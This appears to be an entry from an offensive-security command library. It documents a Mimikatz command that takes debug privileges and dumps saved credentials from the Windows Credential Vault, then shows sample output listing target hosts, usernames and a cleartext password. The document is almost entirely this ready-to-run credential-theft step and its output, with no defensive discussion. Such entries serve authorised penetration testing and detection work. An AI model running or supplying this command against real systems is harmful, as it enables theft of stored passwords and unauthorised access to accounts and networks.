---
id: cac24b1d-e7bd-4b25-ab8c-53e8047fdd17
name: Mimikatz Extract Windows Saved Credentials from Vault
type: command
executor: ''
data: mimikatz.exe "log" "privilege::debug" "vault::cred" "exit"
output: "C:\\Users\\BOB\\Desktop>mimikatz.exe \"log\" \"privilege::debug\" \"vault::cred\"\
  \ \"exit\"\n\n  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47\n .##\
  \ ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi`\
  \ ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n\
  \ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'\
  \        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(commandline)\
  \ # log\nUsing 'mimikatz.log' for logfile : OK\n\nmimikatz(commandline) # privilege::debug\n\
  Privilege '20' OK\n\nmimikatz(commandline) # vault::cred\nTargetName : 10.10.10.10\
  \ / <NULL>\nUserName   : admin\nComment    : <NULL>\nType       : 2 - domain_password\n\
  Persist    : 3 - enterprise\nFlags      : 00000000\nCredential :\nAttributes : 0\n\
  \nTargetName : 1.1.1.1 / <NULL>\nUserName   : BOB\nComment    : <NULL>\nType   \
  \    : 1 - generic\nPersist    : 3 - enterprise\nFlags      : 00000000\nCredential\
  \ : hunter2\nAttributes : 0\n\nTargetName : WindowsLive:target=virtualapp/didlogical\
  \ / <NULL>\nUserName   : 02pjlxgjavhchfme\nComment    : PersistedCredential\nType\
  \       : 1 - generic\nPersist    : 2 - local_machine\nFlags      : 00000000\nCredential\
  \ :\nAttributes : 33\n\nTargetName : Domain:target=10.10.10.10 / <NULL>\nUserName\
  \   : admin\nComment    : <NULL>\nType       : 2 - domain_password\nPersist    :\
  \ 3 - enterprise\nFlags      : 00000000\nCredential :\nAttributes : 0\n\nTargetName\
  \ : LegacyGeneric:target=1.1.1.1 / <NULL>\nUserName   : BOB\nComment    : <NULL>\n\
  Type       : 1 - generic\nPersist    : 3 - enterprise\nFlags      : 00000000\nCredential\
  \ : hunter2\nAttributes : 0\n\n\nmimikatz(commandline) # exit\nBye!"
created_at: '2019-09-27T21:15:40.395046+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mimikatz Extract Windows Saved Credentials from Vault

```bash
mimikatz.exe "log" "privilege::debug" "vault::cred" "exit"
```

## Expected Output

```
C:\Users\BOB\Desktop>mimikatz.exe "log" "privilege::debug" "vault::cred" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # log
Using 'mimikatz.log' for logfile : OK

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # vault::cred
TargetName : 10.10.10.10 / <NULL>
UserName   : admin
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 3 - enterprise
Flags      : 00000000
Credential :
Attributes : 0

TargetName : 1.1.1.1 / <NULL>
UserName   : BOB
Comment    : <NULL>
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential : hunter2
Attributes : 0

TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
UserName   : 02pjlxgjavhchfme
Comment    : PersistedCredential
Type       : 1 - generic
Persist    : 2 - local_machine
Flags      : 00000000
Credential :
Attributes : 33

TargetName : Domain:target=10.10.10.10 / <NULL>
UserName   : admin
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 3 - enterprise
Flags      : 00000000
Credential :
Attributes : 0

TargetName : LegacyGeneric:target=1.1.1.1 / <NULL>
UserName   : BOB
Comment    : <NULL>
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential : hunter2
Attributes : 0


mimikatz(commandline) # exit
Bye!
```


